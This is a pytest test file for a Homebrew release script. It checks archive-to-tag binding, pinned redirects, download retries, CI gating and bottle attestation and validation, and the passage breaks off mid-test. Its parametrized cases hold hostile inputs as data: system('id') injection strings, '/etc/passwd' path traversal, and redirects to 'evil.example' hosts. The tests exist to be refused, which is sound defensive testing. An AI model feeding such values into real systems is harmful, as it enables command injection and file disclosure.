def test_tree_entries_records_what_git_tracks_and_nothing_else(release, tmp_path):
    """Path, executable bit, symlink target, content -- not mtimes, not
    uid/gid, not directories. Verified against the real v0.19.1-sudo.28
    archive, which fingerprints identically to `git archive` of its tag: 601
    entries on each side, zero differences."""
    root = tmp_path / "tree"
    (root / "nested").mkdir(parents=True)
    (root / "plain.txt").write_bytes(b"plain\n")
    (root / "nested" / "script.sh").write_bytes(b"#!/bin/sh\n")
    (root / "nested" / "script.sh").chmod(0o755)
    (root / "link").symlink_to("plain.txt")

    entries = release.tree_entries(root)
    assert set(entries) == {"plain.txt", "nested/script.sh", "link"}
    assert entries["plain.txt"][0] == "100644"
    assert entries["nested/script.sh"][0] == "100755"
    # A symlink is its target string, not the content it resolves to --
    # otherwise a symlink swapped for a copy would compare equal.
    assert entries["link"] == ("120000", hashlib.sha256(b"plain.txt").hexdigest())

    # mtime is not tracked, so touching a file must not change the answer.
    os.utime(root / "plain.txt", (0, 0))
    assert release.tree_entries(root) == entries


def test_a_failing_git_archive_is_a_release_error_with_the_resume_path(
    monkeypatch, release, cut
):
    """`run` has check=True, so a bare CalledProcessError out of `tag_tree`
    would be the one failure on this path reaching the operator without the
    resume hint."""

    def boom(*_a, **_k):
        raise subprocess.CalledProcessError(128, ["git", "archive"], stderr="no tag")

    monkeypatch.setattr(release, "run", boom)
    assert release.tag_tree(cut) is None


def test_a_tag_whose_tree_cannot_be_read_fails_closed(
    monkeypatch, release, cut, tmp_path
):
    """If `git archive` cannot produce the tag's tree there is nothing to
    compare against, so the release must stop rather than skip the binding."""
    commit = "a" * 40
    monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
    monkeypatch.setattr(release, "tag_tree", lambda _r: None)
    body = _tag_archive(tmp_path / "ok.tar.gz", commit, release=cut).read_bytes()
    _fake_archive_download(monkeypatch, release, body)
    with pytest.raises(release.ReleaseError, match="cannot fingerprint"):
        release.require_archive_matches_tag(cut, dry_run=False)


def test_the_archive_must_be_the_tag_commits_tree(monkeypatch, release, cut, tmp_path):
    """N6c: nothing local used to check the archive bytes against the tag.

    GitHub serves an archive by tag *name*; the check existed only in CI, and
    only transitively, through a source.sha256 that carried no attestation.
    """
    wanted, other = "a" * 40, "b" * 40
    monkeypatch.setattr(release, "output", lambda *_a, **_k: wanted)
    _stub_tag_tree(monkeypatch, release)

    for body, expected in (
        (_tag_archive(tmp_path / "ok.tar.gz", wanted, release=cut), None),
        (
            _tag_archive(tmp_path / "no.tar.gz", other, release=cut),
            "is not this tag's",
        ),
        (
            _tag_archive(tmp_path / "bare.tar.gz", None, release=cut),
            "carries no commit id",
        ),
    ):
        # One release per archive: the facts are memoised per URL, which is the
        # whole point of the fix, so a second body needs a fresh memo.
        release._ARCHIVE_FACTS.clear()
        _fake_archive_download(monkeypatch, release, body.read_bytes())
        if expected is None:
            release.require_archive_matches_tag(cut, dry_run=False)
        else:
            with pytest.raises(release.ReleaseError, match=expected):
                release.require_archive_matches_tag(cut, dry_run=False)


def test_every_post_tag_archive_failure_names_the_resume_path(
    monkeypatch, release, cut, tmp_path
):
    """These raise after the tag and Release are published, so a bare message
    leaves the operator with no way out (adversary finding 4, 2026-10-20)."""

    def failure() -> str:
        with pytest.raises(release.ReleaseError) as caught:
            release.require_archive_matches_tag(cut, dry_run=False)
        return str(caught.value)

    monkeypatch.setattr(release, "output", lambda *_a, **_k: "")
    messages = [failure()]
    assert "cannot resolve" in messages[0]

    monkeypatch.setattr(release, "output", lambda *_a, **_k: "a" * 40)
    _stub_tag_tree(monkeypatch, release)
    for name, commit in (("bare", None), ("other", "b" * 40)):
        release._ARCHIVE_FACTS.clear()
        body = _tag_archive(
            tmp_path / f"{name}.tar.gz", commit, release=cut
        ).read_bytes()
        _fake_archive_download(monkeypatch, release, body)
        messages.append(failure())

    assert len(messages) == 3
    for text in messages:
        assert release.RESUME_BY_HAND_HINT in text


def test_a_dead_archive_url_is_a_release_error_not_a_raw_traceback(
    monkeypatch, release, cut
):
    """`__main__` catches only ReleaseError and CalledProcessError, and an
    HTTPError is an OSError, so an unretried fetch here printed a traceback
    after the irreversible steps (adversary finding 4, 2026-10-20)."""

    def opener(*_a, **_k):
        raise urllib.error.HTTPError(cut.archive_url, 404, "Not Found", {}, None)

    monkeypatch.setattr(release._OPENER, "open", opener)
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)
    monkeypatch.setattr(release, "output", lambda *_a, **_k: "a" * 40)
    with pytest.raises(release.ReleaseError, match="could not fetch"):
        release.require_archive_matches_tag(cut, dry_run=False)


def test_a_redirect_off_github_https_is_refused(release):
    """`validate_release_url` sees the first URL only, and urllib's default
    handler will follow a 302 to plain http (adversary finding 1, 2026-10-20).
    github.com 302s a tag archive to codeload.github.com, so that one hop has
    to stay allowed."""
    handler = release.PinnedRedirectHandler()

    def hop(url):
        return handler.redirect_request(None, None, 302, "Found", {}, url)

    for url in (
        "http://codeload.github.com/frdminc/sudo-secretspec/tar.gz/refs/tags/v1",
        "https://codeload.github.com.evil.example/x.tar.gz",
        "https://raw.githubusercontent.com/x.tar.gz",
        "file:///etc/passwd",
        # urllib `urljoin`s a relative Location against the request URL before
        # calling us, so the handler only ever sees absolute URLs -- this is
        # what that resolution looks like when it lands off-host.
        "http://127.0.0.1:9/final",
        # `urlsplit` strips userinfo from .hostname, so the host actually
        # contacted is the one checked.
        "https://github.com@127.0.0.1:9/final",
        # `https:///x` has no host at all; `hostname` is None.
        "https:///final",
    ):
        with pytest.raises(release.ReleaseError, match="refuse redirect"):
            hop(url)

    # The refusal is raised after the tag and Release are published, and is
    # deliberately not retried, so it has to name the way out.
    with pytest.raises(release.ReleaseError) as caught:
        hop("http://evil.example/x.tar.gz")
    assert release.RESUME_BY_HAND_HINT in str(caught.value)

    # The real hop: allowed, so it gets past the check and into urllib's own
    # handler, which is what raises on the stub request object.
    with pytest.raises(AttributeError):
        hop("https://codeload.github.com/frdminc/sudo-secretspec/tar.gz/refs/tags/v1")


def test_the_archive_fetch_goes_through_the_pinned_opener(monkeypatch, release, cut):
    """The pin is one line of wiring, and deleting it used to leave every test
    green with the protection gone (adversary, 2026-10-20). It is module-private
    rather than `install_opener` so importing the formula rewriter in CI does
    not change that process's redirect policy."""
    assert any(
        isinstance(handler, release.PinnedRedirectHandler)
        for handler in release._OPENER.handlers
    )
    # `build_opener` must *replace* the default handler, not stack beside it.
    redirect_handlers = [
        type(h).__name__
        for h in release._OPENER.handlers
        if isinstance(h, release.urllib.request.HTTPRedirectHandler)
    ]
    assert redirect_handlers == ["PinnedRedirectHandler"]
    # And it is not the process-global opener: nothing else in this process
    # should acquire a GitHub-only redirect policy by importing release.py.
    installed = getattr(release.urllib.request, "_opener", None)
    assert installed is None or not any(
        isinstance(h, release.PinnedRedirectHandler) for h in installed.handlers
    )

    # And the fetch actually goes through it: asserting only on the opener's
    # shape left the call site free to go back to `urllib.request.urlopen`
    # with every test still green (adversary, 2026-10-20).
    used = []

    def opener(*_a, **_k):
        used.append(1)
        return _ByteResponse(b"body")

    monkeypatch.setattr(release._OPENER, "open", opener)
    monkeypatch.setattr(
        release.urllib.request,
        "urlopen",
        lambda *_a, **_k: pytest.fail("fetched outside the pinned opener"),
    )
    release.archive_sha256(cut, dry_run=False)
    assert used == [1]


def test_a_truncated_download_is_retried_not_misdiagnosed(
    monkeypatch, release, cut, tmp_path
):
    """`http.client` does not raise on a body shorter than its Content-Length:
    `read` returns b"" and closes. The attempt looked complete, so the memo
    took the digest of the truncated bytes and the missing pax header surfaced
    as the permanent-sounding "not an archive GitHub generated for this tag"
    (adversary, 2026-10-20)."""
    commit = "e" * 40
    body = _tag_archive(tmp_path / "full.tar.gz", commit, release=cut).read_bytes()
    half = len(body) // 2
    responses = [
        # Claims the full length, delivers half: a cut transfer. `http.client`
        # leaves `length` at the unread remainder rather than raising.
        _ByteResponse(
            body[:half], {"Content-Length": str(len(body))}, length=len(body) - half
        ),
        _ByteResponse(body),
    ]
    monkeypatch.setattr(release._OPENER, "open", lambda *_a, **_k: responses.pop(0))
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)

    digest, found, tree = release.archive_facts(cut, dry_run=False)
    assert responses == []  # the short body was retried, not accepted
    assert found == commit
    assert digest == hashlib.sha256(body).hexdigest()
    # The tree comes off the same bytes, so it is present on the good attempt
    # and never built from the truncated one.
    assert tree == _tree_of()


def test_an_undeclared_content_length_still_fetches(monkeypatch, release, cut):
    """Chunked responses carry no Content-Length, so the check has to skip."""
    monkeypatch.setattr(
        release._OPENER,
        "open",
        lambda *_a, **_k: _ByteResponse(b"body", {}, length=None),
    )
    assert (
        release.archive_sha256(cut, dry_run=False)
        == hashlib.sha256(b"body").hexdigest()
    )


@pytest.mark.parametrize(
    "header",
    [
        # `http.client` tolerates both of these -- `int(length)` raises
        # ValueError there too, and it sets self.length = None and reads to
        # close. The raw string stays in `headers`, so comparing against it
        # raised an uncaught ValueError after the tag was published.
        "",
        "40, 40",
        # Chunked wins over Content-Length, but the raw header remains, so the
        # body was compared against a number that was never its length -- five
        # attempts and 45s of backoff for a response that was complete.
        "999",
    ],
)
def test_a_content_length_http_client_ignored_is_ignored_here(
    monkeypatch, release, cut, header
):
    """The gate is `response.length`, not the raw header: no header is parsed
    unless `http.client` parsed it first (adversary, 2026-10-20)."""
    # Without this a regression here takes 45s of real backoff per case before
    # failing, which is itself the cost the chunked case used to pay.
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)
    monkeypatch.setattr(
        release._OPENER,
        "open",
        lambda *_a, **_k: _ByteResponse(
            b"body", {"Content-Length": header}, length=None
        ),
    )
    # No ValueError, no retry, no misdiagnosis.
    assert (
        release.archive_sha256(cut, dry_run=False)
        == hashlib.sha256(b"body").hexdigest()
    )


def test_an_unknown_tag_is_a_release_error_not_a_called_process_error(
    monkeypatch, release, cut
):
    """`output` runs with check=True and `git rev-parse` exits 128, so the real
    failure was a CalledProcessError and the COMMIT_RE guard was reachable only
    under a monkeypatch (adversary, 2026-10-20)."""

    def boom(*_a, **_k):
        raise subprocess.CalledProcessError(
            128, ["git", "rev-parse"], output="", stderr="fatal: ambiguous argument"
        )

    monkeypatch.setattr(release, "output", boom)
    with pytest.raises(release.ReleaseError) as caught:
        release.require_archive_matches_tag(cut, dry_run=False)
    message = str(caught.value)
    assert "cannot resolve" in message
    assert "fatal: ambiguous argument" in message
    assert release.RESUME_BY_HAND_HINT in message


def test_the_archive_is_fetched_once_for_both_the_digest_and_the_commit(
    monkeypatch, release, cut, tmp_path
):
    """N6b: hash #2 was compared with CI, hash #3 was written to the formula --
    and the first fix added a *third* download for the commit check, so the
    bytes bound to the tag were not the bytes pinned (adversary finding 2)."""
    commit = "d" * 40
    body = _tag_archive(tmp_path / "once.tar.gz", commit, release=cut).read_bytes()
    downloads = []

    def opener(*_a, **_k):
        downloads.append(1)
        return _ByteResponse(body)

    monkeypatch.setattr(release._OPENER, "open", opener)
    monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
    _stub_tag_tree(monkeypatch, release)

    release.require_archive_matches_tag(cut, dry_run=False)
    first = release.archive_sha256(cut, dry_run=False)
    second = release.archive_sha256(cut, dry_run=False)

    assert len(downloads) == 1
    assert first == second == hashlib.sha256(body).hexdigest()


def test_a_glob_shaped_bottle_file_name_is_refused(release, cut, tmp_path):
    """N7: the name reaches `gh release download --pattern`, which is a glob."""
    for name in (
        "*.bottle.tar.gz",
        "sudo-secretspec-1.bottle.tar.g?",
        "-rf",
        ".hidden",
        "a[b].bottle.tar.gz",
    ):
        path = tmp_path / "b.bottle.json"
        path.write_text(json.dumps(bottle_json(release, cut, filename=name)))
        with pytest.raises(release.ReleaseError, match="unsafe bottle file name"):
            release.bottle_specs(cut, path)


def test_ci_gate_names_its_workflow_so_one_run_must_match(monkeypatch, release):
    """F3.3: with no workflow, find_run returns the newest of several matches."""
    argvs = []

    def fake_output(argv, **kwargs):
        argvs.append(argv)
        if argv[:3] == ["gh", "run", "list"]:
            return json.dumps([{"databaseId": 8, "headSha": "d" * 40}])
        return ""

    monkeypatch.setattr(release, "output", fake_output)
    release.find_run("ci/run/x", "d" * 40, workflow=release.CI_GATE_WORKFLOW)
    listing = next(a for a in argvs if a[:3] == ["gh", "run", "list"])
    assert "--workflow" in listing and release.CI_GATE_WORKFLOW in listing
    assert "--event" in listing and "push" in listing


def test_a_linked_head_keg_is_named_instead_of_blamed_on_the_bottle(
    monkeypatch, release
):
    """The real .23-.28 pour failure: a HEAD keg, not a missing bottle.

    `brew reinstall` reuses the linked keg's spec, so a linked HEAD keg makes
    `--force-bottle` report "has no bottle" however good the published bottle
    is -- and the build-from-source hint is actively wrong, because a HEAD
    build is what is already installed. The guard must refuse before the
    reinstall and name the unlink/install remedy.
    """
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if argv[:3] == ["brew", "info", "--json=v2"]:
            return completed(argv, _brew_info("HEAD-7c1f700"))
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError) as excinfo:
        release.brew_install_and_test(build_from_source=False, dry_run=False)
    message = str(excinfo.value)
    assert "HEAD-7c1f700" in message
    assert "brew unlink" in message and "--force-bottle" in message
    assert "link --overwrite" in message
    assert "--build-from-source" not in message
    assert not any(argv[:2] == ["brew", "reinstall"] for argv in calls)


def test_a_stable_linked_keg_still_pours(monkeypatch, release):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if argv[:3] == ["brew", "info", "--json=v2"]:
            return completed(argv, _brew_info("0.19.1-sudo.28"))
        if argv[:2] == ["brew", "--prefix"]:
            return completed(argv, "/opt/homebrew/opt/sudo-secretspec\n")
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    prefix = release.brew_install_and_test(build_from_source=False, dry_run=False)
    assert prefix == "/opt/homebrew/opt/sudo-secretspec"
    assert ["brew", "reinstall", "--force-bottle", release.FORMULA_NAME] in calls


def test_unreadable_brew_info_never_fails_the_release(monkeypatch, release):
    """The guard only ever improves a message; it must not become a new way to fail."""

    def fake_run(argv, **kwargs):
        if argv[:3] == ["brew", "info", "--json=v2"]:
            return completed(argv, "not json at all")
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    assert release.linked_head_keg(dry_run=False) is None


def test_watch_run_gives_up_on_a_run_that_never_finishes(monkeypatch, release):
    # `timeout-minutes` in the workflow caps a job's EXECUTION, not the time it
    # sits queued, and GitHub cancels a job waiting on a label nothing matches
    # only after about a day. Without this deadline the bottle watch would block
    # with the tag and Release already public (adversary F1.3, 2026-10-20).
    seen = {}

    def fake_run(argv, **kwargs):
        seen["argv"] = argv
        seen["timeout"] = kwargs.get("timeout")
        raise subprocess.TimeoutExpired(argv, kwargs.get("timeout"))

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError, match="queued or stuck"):
        release.watch_run(5, "the bottle run did not pass")
    assert seen["argv"][:4] == ["gh", "run", "watch", "5"]
    assert seen["timeout"] == release.CI_WATCH_SECONDS


def test_the_bottle_watch_waits_longer_and_names_its_deadline(monkeypatch, release):
    # The bottle job's own cap is 90 minutes against the gate jobs' 60, so its
    # watch has to outlast the gate's or a legitimate build would be cut off.
    assert release.BOTTLE_WATCH_SECONDS > release.CI_WATCH_SECONDS

    def fake_run(argv, **kwargs):
        raise subprocess.TimeoutExpired(argv, kwargs.get("timeout"))

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError, match="after 110 minutes"):
        release.watch_run(
            5, "the bottle run did not pass", timeout_s=release.BOTTLE_WATCH_SECONDS
        )


def test_ci_gate_refuses_a_stale_local_ci_base(monkeypatch, release):
    # github-ci-run overlays a local ci/base before origin's, and fetch leaves
    # it where it was, so an old workflow would gate the release.
    calls = fake_ci(
        monkeypatch,
        release,
        runs=[],
        refs={"refs/heads/ci/base": "1" * 40, "origin/ci/base": "2" * 40},
    )
    with pytest.raises(release.ReleaseError, match="local ci/base differs"):
        release.ci_gate(dry_run=False)
    assert [str(release.CI_WRAPPER), "--no-wait", "HEAD"] not in calls


def test_ci_gate_accepts_a_local_ci_base_matching_origin(monkeypatch, release):
    same = {"refs/heads/ci/base": "1" * 40, "origin/ci/base": "1" * 40}
    fake_ci(
        monkeypatch,
        release,
        runs=[[{"databaseId": 3, "headSha": OVERLAY}]],
        refs=same,
    )
    release.ci_gate(dry_run=False)


def test_ci_gate_gives_up_when_no_run_appears(monkeypatch, release):
    fake_ci(monkeypatch, release, runs=[[]] * release.CI_RUN_LOOKUPS)
    with pytest.raises(release.ReleaseError, match="no GitHub Actions run"):
        release.ci_gate(dry_run=False)


def test_ci_gate_dry_run_only_prints_the_push(monkeypatch, release, capsys):
    release.ci_gate(dry_run=True)
    out = capsys.readouterr().out
    assert "[dry-run] git fetch origin ci/base" in out
    assert f"[dry-run] {release.CI_WRAPPER} --no-wait HEAD" in out
    assert "gh run" not in out


@pytest.mark.parametrize(
    ("flags", "expected"),
    [([], "ci"), (["--local-tests"], "local"), (["--skip-tests"], None)],
)
def test_main_gates_on_ci_unless_told_otherwise(
    monkeypatch, release, cut, flags, expected
):
    seen = []
    monkeypatch.setattr(release, "preflight", lambda _release, **kwargs: None)
    monkeypatch.setattr(release, "ci_gate", lambda **kwargs: seen.append("ci"))
    monkeypatch.setattr(release, "run_tests", lambda **kwargs: seen.append("local"))
    monkeypatch.setattr(release, "run", lambda argv, **kwargs: completed(argv))
    assert release.main(["--version", cut.version, "--dry-run", *flags]) == 0
    assert seen == ([expected] if expected else [])


# The macOS bottle, built by sudo-release.yml on the tag push and poured here.
TAG_SHA = "d" * 40


BOTTLE_BYTES = b"bottle"
BOTTLE_SHA = hashlib.sha256(BOTTLE_BYTES).hexdigest()
SOURCE_SHA = "5" * 64


def bottle_json(release, cut, *, root_url=None, sha=BOTTLE_SHA, **overrides):
    """What `brew bottle --json` records, trimmed to the keys release.py reads."""
    filename = overrides.pop(
        "filename", f"sudo-secretspec-{cut.version}.arm64_tahoe.bottle.tar.gz"
    )
    name = overrides.pop("name", release.FORMULA_NAME)
    tag = overrides.pop("tag", "arm64_tahoe")
    entry = {
        "formula": {
            "name": overrides.pop("formula_name", "sudo-secretspec"),
            "path": overrides.pop(
                "path",
                "Library/Taps/frdminc/homebrew-sudo-secretspec/Formula/sudo-secretspec.rb",
            ),
            "pkg_version": overrides.pop("pkg_version", cut.version),
        },
        "bottle": {
            "root_url": root_url
            or f"https://github.com/{release.FORK_REPO}/releases/download/{cut.tag}",
            "cellar": overrides.pop("cellar", "any"),
            "rebuild": overrides.pop("rebuild", 0),
            "tags": {tag: {"filename": filename, "sha256": sha}},
        },
    }
    assert not overrides, overrides
    return {name: entry}


def fake_bottle_run(
    monkeypatch,
    release,
    cut,
    *,
    runs,
    watch_rc=0,
    doc=None,
    tarball=BOTTLE_BYTES,
    source=SOURCE_SHA,
    asset=BOTTLE_BYTES,
    attest_rc=0,
    attest_fail_suffix="",
):
    """Script the tag lookup, `gh run list/watch/download` for the bottle job."""
    calls = []
    monkeypatch.setattr(release, "archive_sha256", lambda _r, **_k: SOURCE_SHA)

    def fake_run(argv, **kwargs):
        calls.append(argv)
        if argv[:2] == ["git", "rev-parse"]:
            return completed(argv, TAG_SHA + "\n")
        if argv[:3] == ["gh", "run", "list"]:
            return completed(argv, json.dumps(runs))
        if argv[:3] == ["gh", "run", "watch"]:
            return completed(argv, returncode=watch_rc)
        if argv[:3] == ["gh", "run", "download"]:
            dest = Path(argv[argv.index("-D") + 1])
            document = doc or bottle_json(release, cut)
            name = f"sudo-secretspec--{cut.version}.bottle.json"
            (dest / name).write_text(json.dumps(document), encoding="utf-8")
            if source is not None:
                (dest / "source.sha256").write_text(source + "\n", encoding="utf-8")
            for entry in document.values():
                for spec in entry["bottle"]["tags"].values():
                    if (
                        spec["filename"] not in ("", ".", "..")
                        and "/" not in (spec["filename"])
                    ):
                        (dest / spec["filename"]).write_bytes(tarball)
        if argv[:3] == ["gh", "release", "download"]:
            dest = Path(argv[argv.index("-D") + 1])
            (dest / argv[argv.index("--pattern") + 1]).write_bytes(asset)
        if (
            argv[:3] == ["gh", "attestation", "verify"]
            and attest_rc
            and argv[3].endswith(attest_fail_suffix)
        ):
            raise subprocess.CalledProcessError(
                attest_rc, argv, output="", stderr="no attestations found"
            )
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    monkeypatch.setattr(release.time, "sleep", lambda _s: None)
    return calls


def test_fetch_bottle_finds_the_tag_run_by_head_sha_and_downloads_its_json(
    monkeypatch, release, cut, tmp_path
):
    calls = fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[
            {"databaseId": 4, "headSha": "c" * 40},
            {"databaseId": 8, "headSha": TAG_SHA},
        ],
    )
    jsons = release.fetch_bottle(cut, tmp_path, dry_run=False)
    assert [path.name for path in jsons] == [
        f"sudo-secretspec--{cut.version}.bottle.json"
    ]
    assert calls[0] == ["git", "rev-parse", f"{cut.tag}^{{commit}}"]
    lookup = next(argv for argv in calls if argv[:3] == ["gh", "run", "list"])
    assert lookup[3:11] == [
        "-R",
        release.FORK_REPO,
        "--branch",
        cut.tag,
        "--workflow",
        "sudo-release.yml",
        "--event",
        "push",
    ]
    watch = next(argv for argv in calls if argv[:3] == ["gh", "run", "watch"])
    assert watch[3] == "8"
    assert "--exit-status" in watch
    download = next(argv for argv in calls if argv[:3] == ["gh", "run", "download"])
    assert download[:4] == ["gh", "run", "download", "8"]
    assert download[download.index("-n") + 1] == "sudo-secretspec-bottle"


def test_fetch_bottle_verifies_the_json_and_tarball_attestations_against_the_tag(
    monkeypatch, release, cut, tmp_path
):
    calls = fake_bottle_run(
        monkeypatch, release, cut, runs=[{"databaseId": 8, "headSha": TAG_SHA}]
    )
    release.fetch_bottle(cut, tmp_path, dry_run=False)
    verifies = [argv for argv in calls if argv[:3] == ["gh", "attestation", "verify"]]
    tarball = tmp_path / f"sudo-secretspec-{cut.version}.arm64_tahoe.bottle.tar.gz"
    json_file = tmp_path / f"sudo-secretspec--{cut.version}.bottle.json"

    def expected(path):
        return [
            "gh",
            "attestation",
            "verify",
            str(path),
            "--repo",
            "frdminc/sudo-secretspec",
            "--cert-identity",
            (
                "https://github.com/frdminc/sudo-secretspec/.github/workflows/"
                f"sudo-release.yml@refs/tags/{cut.tag}"
            ),
            "--source-ref",
            f"refs/tags/{cut.tag}",
            "--source-digest",
            TAG_SHA,
            "--deny-self-hosted-runners",
        ]

    # The JSON first: it is verified before it is parsed. source.sha256 is
    # verified too, and before it is read: it is the digest the "CI built this
    # source" invariant rests on, and it used to arrive with no provenance at
    # all from the job that runs every build.rs in Cargo.lock (adversary N6a).
    source = tmp_path / release.SOURCE_SHA_FILE
    assert verifies == [expected(json_file), expected(tarball), expected(source)]
    assert not any("--signer-workflow" in argv for argv in verifies)
    # Verified after the download, before the source-archive comparison.
    names = [argv[:3] for argv in calls]
    assert names.index(["gh", "run", "download"]) < names.index(
        ["gh", "attestation", "verify"]
    )


@pytest.mark.parametrize("suffix", [".bottle.json", ".bottle.tar.gz"])
def test_fetch_bottle_refuses_a_file_without_a_valid_attestation(
    monkeypatch, release, cut, tmp_path, suffix
):
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        attest_rc=1,
        attest_fail_suffix=suffix,
    )
    with pytest.raises(
        release.ReleaseError, match="build provenance check failed"
    ) as r:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    assert suffix in str(r.value)


def test_fetch_bottle_does_not_parse_a_json_that_failed_its_attestation(
    monkeypatch, release, cut, tmp_path
):
    # An unattested JSON that is also malformed must fail on the attestation, not
    # on parsing: nothing reads its content before the signature is checked.
    calls = fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        doc=bottle_json(release, cut, cellar='x", system("id"), "'),
        attest_rc=1,
        attest_fail_suffix=".bottle.json",
    )
    with pytest.raises(release.ReleaseError, match="build provenance check failed"):
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    assert len([a for a in calls if a[:3] == ["gh", "attestation", "verify"]]) == 1


def test_fetch_bottle_refuses_a_tarball_without_a_valid_attestation(
    monkeypatch, release, cut, tmp_path
):
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        attest_rc=1,
    )
    with pytest.raises(release.ReleaseError) as refusal:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    message = str(refusal.value)
    assert "build provenance check failed" in message
    assert f"refs/tags/{cut.tag}" in message
    assert TAG_SHA in message
    assert "no attestations found" in message
    assert "--build-from-source" in message


def test_fetch_bottle_does_not_attest_a_tarball_that_failed_its_sha_check(
    monkeypatch, release, cut, tmp_path
):
    calls = fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        tarball=b"tampered",
    )
    with pytest.raises(release.ReleaseError):
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    verified = [a[3] for a in calls if a[:3] == ["gh", "attestation", "verify"]]
    assert [Path(path).suffix for path in verified] == [".json"]


def test_fetch_bottle_names_the_fallback_when_the_run_is_red(
    monkeypatch, release, cut, tmp_path
):
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        watch_rc=1,
    )
    with pytest.raises(release.ReleaseError, match="--build-from-source") as raised:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    assert "actions/runs/8" in str(raised.value)


def test_fetch_bottle_names_the_fallback_when_no_run_appears(
    monkeypatch, release, cut, tmp_path
):
    fake_bottle_run(monkeypatch, release, cut, runs=[])
    with pytest.raises(release.ReleaseError, match="--build-from-source"):
        release.fetch_bottle(cut, tmp_path, dry_run=False)


def test_fetch_bottle_refuses_a_bottle_that_points_at_another_release(
    monkeypatch, release, cut, tmp_path
):
    other = bottle_json(release, cut, root_url="https://example.com/elsewhere")
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        doc=other,
    )
    with pytest.raises(release.ReleaseError, match="wrong root_url"):
        release.fetch_bottle(cut, tmp_path, dry_run=False)


def test_find_run_refuses_when_more_than_one_push_run_matches(
    monkeypatch, release, cut, tmp_path
):
    # A re-pushed tag or a second run for one commit: guessing "the newest" could
    # watch and trust a run that did not build the bottle.
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[
            {"databaseId": 9, "headSha": TAG_SHA},
            {"databaseId": 8, "headSha": TAG_SHA},
        ],
    )
    with pytest.raises(release.ReleaseError, match="refusing to guess") as raised:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    assert "--build-from-source" in str(raised.value)
    with pytest.raises(release.ReleaseError, match="9, 8"):
        release.find_run(cut.tag, TAG_SHA, workflow="sudo-release.yml")


def test_find_run_without_a_workflow_keeps_the_newest_match(monkeypatch, release, cut):
    # ci_gate's ci/run branch can legitimately hold two runs for one overlay.
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[
            {"databaseId": 9, "headSha": TAG_SHA},
            {"databaseId": 8, "headSha": TAG_SHA},
        ],
    )
    assert release.find_run("ci/run/x", TAG_SHA) == 9


def test_fetch_bottle_refuses_a_tarball_that_does_not_match_its_json(
    monkeypatch, release, cut, tmp_path
):
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        tarball=b"swapped",
    )
    with pytest.raises(release.ReleaseError, match="does not hash to the sha256"):
        release.fetch_bottle(cut, tmp_path, dry_run=False)


@pytest.mark.parametrize(
    ("overrides", "message"),
    [
        ({"name": "someone/else/sudo-secretspec"}, "exactly one entry"),
        ({"pkg_version": "0.19.1-sudo.1"}, "not 0.19.1-sudo"),
        ({"filename": "../escape.bottle.tar.gz"}, "unsafe bottle file name"),
        ({"filename": "sub/dir.bottle.tar.gz"}, "unsafe bottle file name"),
        ({"filename": "back\\slash.bottle.tar.gz"}, "unsafe bottle file name"),
        ({"filename": ".."}, "unsafe bottle file name"),
        ({"formula_name": "other"}, "formula is 'other'"),
        ({"path": "Library/Taps/x/y/Formula/z.rb"}, "formula path"),
        ({"path": "../../etc/passwd"}, "formula path"),
        ({"cellar": 'x", system("id"), "'}, "unexpected cellar"),
        ({"cellar": "/tmp/Cellar"}, "unexpected cellar"),
        ({"cellar": None}, "unexpected cellar"),
        ({"rebuild": -1}, "rebuild -1"),
        ({"rebuild": True}, "rebuild True"),
        ({"rebuild": "1"}, "rebuild '1'"),
        ({"rebuild": 1.0}, "rebuild 1.0"),
        ({"tag": 'arm64_tahoe": "x", system("id"), "y'}, "unexpected bottle tag"),
        ({"tag": "ARM64"}, "unexpected bottle tag"),
        ({"tag": "arm64_tahoe\n"}, "unexpected bottle tag"),
        ({"sha": "A" * 64}, "64 lowercase hex"),
        ({"sha": "a" * 63}, "64 lowercase hex"),
        ({"sha": "a" * 64 + "\n"}, "64 lowercase hex"),
    ],
)
def test_fetch_bottle_refuses_a_json_describing_something_else(
    monkeypatch, release, cut, tmp_path, overrides, message
):
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        doc=bottle_json(release, cut, **overrides),
    )
    with pytest.raises(release.ReleaseError, match=message):
        release.fetch_bottle(cut, tmp_path, dry_run=False)


def test_fetch_bottle_refuses_a_second_entry_in_the_json(
    monkeypatch, release, cut, tmp_path
):
    doc = bottle_json(release, cut)
    doc.update(bottle_json(release, cut, name="x/y/other"))
    fake_bottle_run(
